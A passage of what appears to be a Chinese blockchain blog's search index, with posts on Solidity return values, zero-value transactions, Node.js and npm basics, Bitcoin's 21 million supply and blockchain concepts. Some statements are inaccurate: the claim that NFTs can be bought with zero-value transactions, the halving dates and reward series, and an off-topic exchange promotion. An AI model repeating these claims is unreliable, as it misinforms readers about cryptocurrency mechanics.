_array)声明了返回变量类型以及变量名。这样，我们在主体中只需要给变量_number，_bool和_array赋值就可以自动返回了。 当然，你也可以在命名式返回中用return来返回变量： // 命名式返回，依然支持return function returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array){ return(1, true, [uint256(1),2,5]); } 解构式赋值 solidity使用解构式赋值的规则，支持读取函数的全部或部分返回值。 读取所有返回值：声明变量，并且将要赋值的变量用,隔开，按顺序排列。 uint256 _number; bool _bool; uint256[3] memory _array; (_number, _bool, _array) = returnNamed(); 读取部分返回值：声明要读取的返回值对应的变量，不读取的留空。下面这段代码中，我们只读取_bool，而不读取返回的_number和_array： (, _bool2, ) = returnNamed(); ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:4:4","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识"],"content":"“零值交易”或“空交易” 在区块链交易中，有些交易的金额确实为0。这种类型的交易被称为“零值交易”或“空交易”，通常是因为这些交易的目的不是为了传递数字货币或资产，而是为了传递其他类型的信息或执行某些特定的功能。 零值交易通常被用来表示某种状态。比如，一个人可能会发送一笔零值交易来表达对某个特定事件的支持或反对。另外，零值交易也可以被用作一种信号，通知其他节点执行某些操作，例如清理过期的状态或触发链上事件。 在一些特定的区块链平台上，零值交易也被用来进行“零值代币转账”（Zero-value token transfer），也就是将一个不具有实际价值的代币传递给其他账户。这类零值代币通常被用来表示一些特定的权益、票据或其他一些数据，并且不具有任何实际的货币价值。零值代币转账的作用在于传递这些数据，并且在链上记录它们的转移历史。 需要注意的是，零值代币转账与实际的代币交易是有区别的。在零值代币转账中，转移的是一些数据或权益，而不是代币本身。这些数据或权益可以被视为与代币绑定的元数据，它们的价值通常是由外部因素决定的，例如某个特定的市场需求或信任度。 ","date":"2020-03-22","objectID":"/posts/zero-value-transfer.html:0:1","tags":["basic"],"title":"区块链上为什么有的交易值是0？","uri":"/posts/zero-value-transfer.html"},{"categories":["基础知识"],"content":"可能出现的情况 执行智能合约：在以太坊或其他智能合约平台上，零值交易可以用来执行智能合约代码。这些交易不需要包含任何数字货币或代币，因为它们是通过执行合约代码来实现的。例如，如果您想在以太坊上购买一个非常昂贵的NFT，您可以通过执行智能合约代码来完成购买，而不需要在交易中发送任何数字货币。 发送消息：零值交易可以用来发送加密消息。这些消息可以包含文本、图像、视频或其他类型的数据。例如，您可以使用0值交易将加密消息发送给另一个人，而不需要在交易中发送任何数字货币。 部署智能合约：在以太坊或其他智能合约平台上，您需要向网络发送交易来部署新的智能合约。这些交易通常不需要包含任何数字货币或代币，因为它们是通过执行智能合约代码来实现的。因此，这些交易可能会被视为零值交易。 ","date":"2020-03-22","objectID":"/posts/zero-value-transfer.html:0:2","tags":["basic"],"title":"区块链上为什么有的交易值是0？","uri":"/posts/zero-value-transfer.html"},{"categories":["基础知识"],"content":"区块链浏览器提示 关于“zero-value token transfer”的提示，这通常是在代币交易中看到的。零值代币转移是指在代币交易中传递代币数量为0的交易。这些交易通常用于触发智能合约或表示某些其他类型的事件。例如，在ERC-20代币交易中，您可以使用零值代币转移来表示向合约发送一条消息，而不需要发送任何实际代币。 ","date":"2020-03-22","objectID":"/posts/zero-value-transfer.html:0:3","tags":["basic"],"title":"区块链上为什么有的交易值是0？","uri":"/posts/zero-value-transfer.html"},{"categories":["基础知识"],"content":"总结 总之，零值交易和零值代币转移在区块链交易中都是很常见的，它们允许开发人员执行更多类型的操作，而不仅仅是传递数字货币或代币。 ","date":"2020-03-22","objectID":"/posts/zero-value-transfer.html:0:4","tags":["basic"],"title":"区块链上为什么有的交易值是0？","uri":"/posts/zero-value-transfer.html"},{"categories":null,"content":"专注于区块链智能合约开发和审计","date":"2019-08-02","objectID":"/about.html","tags":null,"title":"关于","uri":"/about.html"},{"categories":null,"content":"关于 沉淀区块链 ","date":"2019-08-02","objectID":"/about.html:1:0","tags":null,"title":"关于","uri":"/about.html"},{"categories":["基础知识"],"content":"1 基础语法 ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:1:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"1.1 定义变量 var 允许对同一个变量重新定义，覆盖原有值。 var a = 1; var a = 2; let 允许修改，但不允许重新定义 let b = 1; b = 2; const 初始化后不允许修改 const c = 100; ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:1:1","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"1.2 解构赋值 1.2.1 数组的解构赋值 let arr = [0,1,2,3,4,5,6] let [a, b, c, d] = arr console.log(a, b, c) // 0 1 2 1.2.2 对象的解构赋值 const person = { name: '5oneXj', age: 18 } let {name, age} = person console.log(name, age) // 5oneXj 18 // 如果自动推导需要同名，否则需要指定 let {name:name1, age:age1} = person console.log(name1, age1) // 5oneXj 18 1.2.3 函数参数的解构赋值 const person = { name: '5oneXj’, age: 18 } function printPerson({name, age}){ console.log(`姓名：${name}，年龄：${age}`) } printPerson(person) // 姓名：5oneXj，年龄：18 ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:1:2","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"1.3 箭头函数 // 只适合用于普通函数 // 不要用在构造函数、不要用在成员函数、不要用在原型函数 let add = (a, b) =\u003e { return a + b } // 函数内一句可简写 let add = (a, b) =\u003e a + b console.log(add(1, 2)) // 3 ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:1:3","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"1.4 Class // `函数式语言，所以一切皆函数，所有对象都是从函数原型继承而来`。 class Person { constructor(name, age){ this.name = name; this.age = age } // 注意，函数没有function method(){ console.log('Person method') } } // 继承 class Man extends Person { constructor(name, age){ super(name, age) } // 重写父类方法 method(){ console.log('Override Person method') } } let p = new Person('5oneXj', 27) p.method() // Person method let m = new Man('sxj', 27) m.method() // Override Person method ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:1:4","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"2 进阶用法 ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:2:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"2.1 同步调用（阻塞） var fs = require(\"fs\") var data = fs.readFileSync(\"test.text\", 'utf-8') console.log( data.toString() ) ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:2:1","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"2.2 异步调用（非阻塞） var fs = require(\"fs\") fs.readFile(\"test.text\", 'utf-8', function (err, data){ if(err) return console.error(err); console.log( data.toString() ); }) ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:2:2","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"2.3 模块导入导出 // exports.js functoin say(){ return true; } functoin hear(){ return true; } // 导出单个 module.exports = say // 导出多个， 可以使用点函数，例如 test.say() module.exports = test = { say, hear } // 导出多个需要指定对应导出方法, let {say, hear} = require(‘./exports’) module.exports = { say, hear } let test = require(‘./exports’) test.say() test.hear() ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:2:3","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"2.4 path模块 let path = require('path') let p = '/Users/jollysone/Downloads/tracks.csv' path.basename(p) // 返回路径的最后一部分，tracks.csv path.dirname(p) // 返回路径的目录名，/Users/jollysone/Downloads/ path.extname(p) // 返回路径的后缀，.csv // 拼接路径，自动过滤多余斜线，最后一个不过滤，不知道是文件还是目录 path.join('/Users/jollysone/', '/Downloads/', 'tracks.csv/') // 将一个路径正常化 path.normalize('/Users//jollysone//Downloads//tracks.csv') // 基于当前node的执行目录与路径名字拼接 path.resolve('tracks.csv') // /home/tracks.csv ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:2:4","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"2.5 文件操作模块(同步异步) var fs = require('fs') // 同步读取 var data = fs.readFileSync(\"test.txt\", 'utf-8') // 异步读取 fs.readFile(\"test.txt\", 'utf-8', function (err, data){ if(err) return console.error(err); console.log( data.toString() ); }) // 同步写入 fs.writeFileSync(\"output.txt\", data.toString()) // 异步写入 fs.writeFile(\"output.txt\", data.toString(), (res) =\u003e { if(res){ console.log('异步写入失败！'); return } console.log('异步写入成功！'); }) // 同步读取文件的状态和信息，可以调取里面的成员变量信息 let stat = fs.statSync(\"output.txt\") console.log(stat.isFile); // 是否文件 console.log(stat.isDirectory); // 是否目录 // 同步删除文件 fs.unlinkSync(\"output.txt\") ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:2:5","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"2.6 Promise // 解决大量缩进的回调函数不易阅读的 callback hell 问题。 // 解决大量 异步调异步的嵌套。 new Promise(回调函数); // 异步读取文件封装成 Promise var fs = require('fs') let filePromise = new Promise(function (success, failed){ // 异步读取 fs.readFile(\"test.txt\", 'utf-8', function (err, data){ if(err){ failed(err); } // ... success(data); // 成功调用 }) }); filePromise.then(res =\u003e { console.log('data:', res); }).catch(err =\u003e { console.log(err); }) ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:2:6","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"2.7 async/await // 接上面 Promise // 直接将 Promise 异步代码变为同步写法，但是仍然是异步执行的。 async function demo(){ // 相当于 Promise.then 部分 try { let data = await filePromise } catch (e){ console.log(e); } } demo(); console.log('我是同步代码'); ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:2:7","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"2.8 Promise实际应用 // 将每个回调函数都封装成一个 Promise，然后用 async/await 将异步代码变为同步写法。 // 异步读取 Promise let readfilePromise = () =\u003e { return Promise((success, failed) =\u003e { fs.readFile(\"test.txt\", 'utf-8', function (err, data){ if(err){ failed(err); } success(data); }) }) } // 异步写入 Promise let writefilePromise = (data) =\u003e { return Promise((success, failed) =\u003e { fs.writeFile(\"test.txt\", data, function (err){ if(err){ failed(err); } success(‘异步写入成功’); }) }) } // 异步查询文件状态 Promise let statfilePromise = () =\u003e { return Promise((success, failed) =\u003e { fs.stat(\"test.txt\", function (err, stat){ if(err){ failed(err); } success(stat); }) }) } // 异步读取 =\u003e 异步写入 =\u003e 异步查询 let demo = async () =\u003e { try { let data = await readfilePromise(); let res = await writefilePromise(data); console.log('写入结果', res); let stat = await statfilePromise(); console.log('stat:', stat); } catch (e){ console.log(e); } } ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:2:8","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"3 NPM使用 # 装淘宝镜像使用 cnpm 命令 $ npm install cnpm $ npm i cnpm # 简写 # 在项目初始化生成 package.json 文件，npm 项目都有这个文件 $ npm init # 跳过向导，快速生成 package.json 文件 $ npm init -y # 安装指定依赖包 --save 参数安装同时会更新 package.json 文件中依赖项 # npm5 以后就不需要添加 $ npm install 包名 --save # 一次性安装 package.json 中的依赖项 $ npm install # 安装指定依赖包 $ npm install 包名 $ npm install —global 包名 $ npm install 包名 包名 包名 包名 $ npm install 包名@版本号 # 卸载指定依赖包 $ npm uninstall 包名 # 查看依赖包信息 $ npm view 包名 # 查看帮助 $ npm 命令 --help # 查看 npm 配置信息 $ npm config list # 设置镜像源 $ npm config set registry https://registry.npm.taobao.org # 清理缓存 $ npm cache clean --force ","date":"2019-03-31","objectID":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html:3:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/posts/node.js-technology-is-a-must-for-learning-blockchain.html"},{"categories":["基础知识"],"content":"1 比特币发行量由什么决定？ 对于发行总量的粗略描述是这样的：每10分钟产生一定量的比特币，每四年减半，发行总量上限是2100万枚。 说说减半的规律，2009年1月比特币的创世区块诞生，所谓创世区块就是比特币区块链上的第0个区块，这个区块中生成的比特币数量是50个，10分钟之后系统上会出现下一个区块，生成的比特币数量依然是50个。比特币系统规定每四年比特币的产量会减半，也就是说从2009年开始，每分钟产生50个;四年之后，每10分钟产生25个;再过四年，每10分钟产生12.5个，到2140年所有的比特币将会被全部生产出来，总量是2100万。 上面就是对于比特币发行过程的粗略描述，所谓粗略，就是有些数据是不精确的，例如通过计算器就可以算出到2140年，实际发出的比特币总量是要略小于2100万的。 ","date":"2018-03-06","objectID":"/posts/origin-of-bitcoins-21-million-circulation.html:1:0","tags":["基础知识","比特币","BTC"],"title":"比特币发行量由什么决定？比特币2100万发行量由来？","uri":"/posts/origin-of-bitcoins-21-million-circulation.html"},{"categories":["基础知识"],"content":"2 比特币2100万发行量由来 全文导读 根据区块链数据显示，币安交易所目前资产40.5亿美元，共有911个交易对，24小时成交额195.2亿美元，24小时内涨幅85.15%，在全球交易所综合排行榜中，币安交易所暂居第一位，同时币安交易所是国内三大交易所之一。 如果比特币要发展成为单一的世界货币(取代M1数字所包含的所有货币)，那么每个BTC的价值将为100万美元。因为每个比特币中有1亿个聪，所以每个聪的价值为0.01美元。 如果中本聪不是故意的，那么这些数字如此紧密地接近事实真是一个惊人的巧合。 比特币被中本聪设计上限为2100万个。通过限制其最大供应量，并减慢新比特币的出产出速度，中本聪希望每个比特币单位(目前称为“聪”)随着时间的推移而升值。 根据中本聪和比特币核心贡献者迈克·赫恩共享的一封电子邮件，中本聪认为，如果2100万个BTC被世界经济的某一部分使用，那么0.001 BTC的价值约为1欧元。 这个预测在2013年实现，当时比特币首次突破了1000欧元的价格点;如今，每个0.001个BTC的价值接近8.25欧元。 尽管中本聪在电子邮件中将比特币的价格与欧元进行了比较，但一些简单的数学运算表明他可能对比特币有更宏大的愿景，这样从侧面解释了为什么选择了上限为2100万的数字。 比特币诞生之时，全世界的货币供应量约为21万亿美元。这个数字被称为M1货币供应量，由世界上所有实物货币的总价值组成，包括现金、黄金、支票等等。 尽管M1货币供应量替代理论可能是中本聪选择2100万作为比特币上限的最合理的理由，但还有另一种(可能更简单)的解释。 查看用于控制比特币供应的参数，可以很清楚地看到2100万比特币的数字使网络能够确保在规则的时间段(10分钟)内开采区块。 它还可以确保，随着最大供应量接近其上限，作为出块奖励，支付给矿工的比特币数量会随着时间的流逝而减少。事实证明，中本聪为此设置的参数不可避免地导致最多只能生产2100万BTC。 比特币核心代码目前对挖掘难度做出了调整，以确保平均每10分钟挖掘一次新区块，而不管网络的哈希率是多少。基于此功能，每四年周期中应开采21万个区块，此后区块奖励将减半。 第一个周期看到每个区块产出了50个BTC;该数字在2012年减半至25BTC /区块，然后在2016年再次减至12.5BTC /区块。继2022年减半之后，目前位于6.25 / BTC区块。 如果向前推算，您会发现每个周期的块奖励总和等于100(50+25+6.25+3.125+1.5625+….依此类推)。通过将该数字乘以21万个块/周期图，您可以得出最大的2100万的最大供应量。 ","date":"2018-03-06","objectID":"/posts/origin-of-bitcoins-21-million-circulation.html:2:0","tags":["基础知识","比特币","BTC"],"title":"比特币发行量由什么决定？比特币2100万发行量由来？","uri":"/posts/origin-of-bitcoins-21-million-circulation.html"},{"categories":["基础知识"],"content":"3 总结 通过以上介绍，相信大家对于比特币发行量由什么决定这个问题已经有所了解，其实对于投资者来说，在比特币交易过程中，最为重要的就是多了解，多学习，毕竟投资有风险，入市需谨慎，这句话大家都知道，举个例子，就好比开着船在大海里航行，没有人能零风险面对，左右不了市场行情的波动，只能增加舵手的能力和船的质量，那样行情的时候你的安全多一份保障，对应的面对的危险是不是少了一份。 ","date":"2018-03-06","objectID":"/posts/origin-of-bitcoins-21-million-circulation.html:3:0","tags":["基础知识","比特币","BTC"],"title":"比特币发行量由什么决定？比特币2100万发行量由来？","uri":"/posts/origin-of-bitcoins-21-million-circulation.html"},{"categories":["基础知识"],"content":"1 区块链的由来 区块链概念最早是从比特币衍生出来的。比特币（Bitcoin）诞生于2008年，是由一个名叫中本聪（Satoshi Nakamoto）的人首次提出，这个人非常神秘，至今没有他的任何准确信息。在提出后不久，比特币就诞生了。 比特币以及其他数字货币的核心技术称为区块链技术。区块链（Blockchain）在信息技术里是一种数据结构或数据存储方式。它创新性地组合了 密码技术、点对点（P2P）网络、分布式部署等技术，可以称其为一个划时代的理念。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:1:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"2 区块链概念 区块链可以借由密码学，串接并保护内容的串联交易记录(又称区块)。在区块链中，区块内容具有 难以篡改 的特性，每一个区块都包含了 前一个区块的加密散列、相应时间戳 和 交易数据(通常用Hash树计算的散列值表示)。用区块链串接的分布式账本能让交易双方有效地记录交易，且可永久查验。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:2:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"3 区块链原理 区块链技术可以认为是要解决互联网时代下的 “拜占庭将军问题”，即在网络中的中心节点和信息传递通道都缺乏可信度的情况下，如何使网络中的各个节点达成共识。 区块链技术在去中心化、各节点无须事先信任的情况下，通过加密算法、共识机制和特定的数据存储方式，构建一个集体维护的可靠的数据模式，实现数字资产在网络节点之间的转移。 拜占庭将军问题 拜占庭将军问题，首先是由Leslie Lamport与另外两人在1982年提出，故事的模型非常简单，却困扰了计算机科学家们数十年，可以说拜占庭将军问题是计算机分布式系统里的一个比较棘手的问题。 故事大概是这么说的：拜占庭帝国指的是中世纪的土耳其，拜占庭帝国拥有巨大的财富，周围有10个邻邦对拜占庭垂涎已久，但拜占庭高墙耸立，固若金汤，没有任何一个单独的邻邦能够成功入侵。任何单个邻邦入侵的都会失败，同时也有可能自身被其他9个邻邦同时入侵。拜占庭帝国防御能力如此之强，至少要有十个邻邦中的一半以上同时进攻，才有可能攻破。大家可能会想，这个还不简单，只要5个以上邻邦达成一致一起入侵，干掉拜占庭帝国岂不是很容易。然而，大家有没有想过一个问题，如果其中的一个或者几个邻邦本身答应好一起进攻，但实际过程出现背叛，那么其余入侵者都会被歼灭。于是每一方都小心行事，不敢轻易相信邻国。这就是拜占庭将军问题，在拜占庭问题里，各邻国最重要的事情是：所有将军如何能过达成共识去攻打拜占庭帝国。 达成共识并非坐下来开个会那么简单，有的将军心机深不可测，口是心非，如果有叛徒，可能会出现各种各样的问题，比如：叛徒可能欺骗某些将军自己将采取进攻行动，结果最后却没有行动。或者叛徒可能怂恿其他将军行动。再或者叛徒可能迷惑其他将军，使他们接受不一致的信息，从而让对方困惑到底要不要进攻，导致无法行动。科学家们做过深入的分析和研究，最后的结论是只要叛徒的数量大于等于1/3，那么任务就会失败。 那这个问题怎么解决呢，起初科学家提出了两种解决方案： 第一个方案是口头信息协议，也就是每个邻邦的将军们派人用口信传达消息，口头协议的算法很简单，如果其中一个邻邦发消息出去是进攻还上撤退，信息会传到所有其他邻邦，然后每个邻邦收到信息同样也是将信息传递给其余所有邻邦，每个邻邦都是信息的转达者，一轮下来，每个节点手上都会有10个信息（进攻或者撤退），有叛徒的话，那信息可能有进攻或者不进攻的不一致消息。每个人相当于手里有一本消息的账本，该到底怎么决策呢？如果有一半以上的人说进攻，那么采取进攻行动就是能成功的，所以这时即便有叛徒，只要听大部分人的，少数服从多数来行动就没什么大问题。但是这种口头协议的算法也存在明显的缺点，口头协议并不会告知消息的上一个来源是谁，也就是消息不可追根溯源，出现信息不一致也很难找到叛徒在哪里。 第二个方案是书面信息协议，既然上面说的消息无法追溯根源，那就用写信，信上还要带上将军的签名，比如每个国家都向其他所有国家写信，约定几月几日几点几分一起攻打拜占庭，收到信的国家如果同意就签字盖章，这些方式相比口头信息，消息都是有记录的，有了叛徒也能会找出来。但是在现实中也面临几个问题，首先中世纪的邻邦之间沟通只能靠信使骑马，将军们互不信任，也不可能亲自聚在一起开会，物理距离导致信息传输延迟。真正可信的签名体系难以实现。签名造假的问题也没法避免。签名消息记录的保存难以摆脱中心化的机构。另外，倘若每个国家都各自向其他9个国家派出信使，在这个网络层面即需要90次的传输才能完成一轮信息交流，但是每个国家可能回馈不同的进攻时间，在这种异步通信的条件下，要能协商一致是个大问题。 这就是一个由互不信任的各个邻邦国家所构成的分布式网络，要获得最大的利益，又必须一起努力才能完成，如何达成一致的共识，变成了一个难题。 首先，数据被按时间顺序划分成区块，每一个区块存放一段时间内的所有价值交换信息，所有节点存储这段时间内的数据，并且永久保存，各个节点通过特定的计算争夺领导权，将下一时间段的信息进行打包分发，并通过某种特定的信息添加到上一区块的后面，构成区块链结构。 这种区块链结构的特点就是可以保证数据的完整性，因为每一个区块都会存储它被创建之前的所有价值交换信息;还可以保证数据的严谨性，因为一旦新的区块被加入链中，之前的区块就再也不能修改。 区块链实现了从记录到传输再到存储的全面分布式的模式，数据传输、数据验证、数据存储都去中心化，所有参与者共同构建数据库。 区块链采用非对称加密算法以提高数据的可信赖度，非对称加密即指加密和解密使用不同的密码，即公钥和私钥。加密数据所用的密码被称为公钥，是所有人都知道的、可以用来给信息加密的密码;解密数据所用的密码被称为私钥，是只有 该信息的接收者知道并用于解密的密码。公钥加密的信息只有使用对应的私钥才可以解密。 实际情况中，假设甲向乙发送一个信息，甲、乙各自生产一对公钥与私钥用以加密和解密，甲、乙分别保管自己的私钥并向对方告知公钥，如果甲向乙发送信息，那么甲用乙的公钥进行加密并向乙发送加密后的信息，乙收到消息后用自己的私钥解密，网络中其他参与者均无法解密。这种算法强度高的加密方式保证了区块链信息的可信赖度。 区块链使用数学方法解决信任问题，用算法代替中心化的第三方机构，为人们创造信用，帮助人们达成共识。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:3:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"4 区块链特点 区块链技术具有去中心化、信息不可篡改、信息透明和可共同维护等特点，下面将分别进行详细阐述。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:4:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"4.1 去中心化 去中心化就是指网络中各个节点的地位相等，传输内容和交易数据不再需要通过某个中心节点进行，数据也不再存储在中心节点上，这样可以防止因中心节点权力过大而引起的风险。区块链模式中，每个节点都存储数据交易中所有的价值交换数据，取代了中央计算机存储所有信息的模式。 另外，每个节点不仅会参与数据存储，还会验证其他节点记录信息的正确性。只有当某个记录的正确性被大部分节点认同，或者所有节点的对比结果一致时，它才可以被写入链中。 同时，为了保护数据信息不会因节点受攻击或其他意外而丢失，区块链会对所有数据进行分布式存储(将数据存储在网络中的每一个参与的节点中)，并实时更新，极大地提高了数据库的安全性。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:4:1","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"4.2 信息不可篡改 区块链网络中，每个参与节点都保存一份完整的交易历史记录，这样，任何一个节点想篡改这些历史记录，别的节点都可以拿出自己的数据备份进行证伪。所以，信息一旦被写入区块中，就不能更改、撤销了。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:4:2","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"4.3 信息透明 区块链中的项目和数据都是公开透明的。区块链项目组会公示项目信息和项目代码，区块中的数据经处理后被公开在区块链上，意味着所有的交易信息都是公开可见的。极短时间内，区块信息会被发送到网络中的所有节点上，实现全网数据同步，每个节点都能回溯交易双方过去的所有交易信息。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:4:3","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"4.4 可共同维护 在整个区块链系统中，无论是价值的提供者还是价值的接收者，都可以充当维护者，共同维护整个区块链信息的可靠性。 区块链系统是开放的，除了价值交易双方的私有信息被加密外，系统还由其中所有参与节点共同维护，任何一个节点都可以通过公开的接口查询区块链数据和开发相关应用，共同维护整个系统的信息透明度和可信赖性。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:4:4","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"5 区块链技术体系 第一层：数据层，存储底层数据、非对称数据加密和时间戳等基础数据。 第二层：网络层，含有分布式组网机制、数据传播机制、数据验证机制等。 第三层：共识层，封装有各类共识机制算法，确定记账决定方式，这关系到整个系统的安全性和可靠性。目前较为知名的由共识层封装的共识机制有工作量证明机制(PoW，Proof of Work)、股份授权证明机制(DPoS，Delegated Proof of Stake)、权益证明机制(PoS，Proof of Stake)等。 第四层：激励层，在区块链技术体系中使用的经济手段，包括经济激励的发行以及分配，多出现在公有链中。 第五层：合约层，封装区块链系统中的脚本代码、算法以及智能合约，帮助区块链灵活地处理数据。 第六层：应用层，封装了各种应用场景和案例，如电商购物、新闻浏览、视频观看等。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:5:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"6 区块链类型 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:6:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"6.1 公有区块链（公链） 公有区块链（Public Block Chains)：世界上任何个体或者团体都可以发送交易，且交易能够获得该区块链的有效确认，任何人都可以参与其共识过程。 公有区块链是最早的区块链，也是应用最广泛的区块链，各大bitcoins系列的虚拟数字货币均基于公有区块链，世界上有且仅有一条该币种对应的区块链。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:6:1","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"6.2 联合区块链（联盟链） 行业区块链（Consortium Block Chains)：由某个群体内部指定多个预选的节点为记账人，每个块的生成由所有的预选节点共同决定（预选节点参与共识过程），其他接入节点可以参与交易。 但不过问记账过程(本质上还是托管记账，只是变成分布式记账，预选节点的多少，如何决定每个块的记账者成为该区块链的主要风险点），其他任何人可以通过该区块链开放的API进行限定查询。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:6:2","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"6.3 私有区块链（私链） 私有区块链（Private Block Chains)：仅仅使用区块链的总账技术进行记账，可以是一个公司，也可以是个人，独享该区块链的写入权限，本链与其他的分布式存储方案没有太大区别。传统金融都是想实验尝试私有区块链，而公链的应用例如bitcoin已经工业化，私链的应用产品还在摸索当中。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:6:3","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"7 区块链应用 区块链技术已经广泛应用于生活中各个领域，例如金融、医疗、内容社交平台、慈善、教育、版权保护、投票等。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:7:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"7.1 金融 区块链具有的信息透明、不可篡改的特点，在金融领域得到深入应用。各类金融资产如股权、债券、基金等都可以被融入区块链中，以“数字资产”的形式在区块链上进行存储和交易。跨境支付、数字货币、数字票据、支付清算、征信管理、证券交易和保险管理等方面也能从区块链技术中获益。 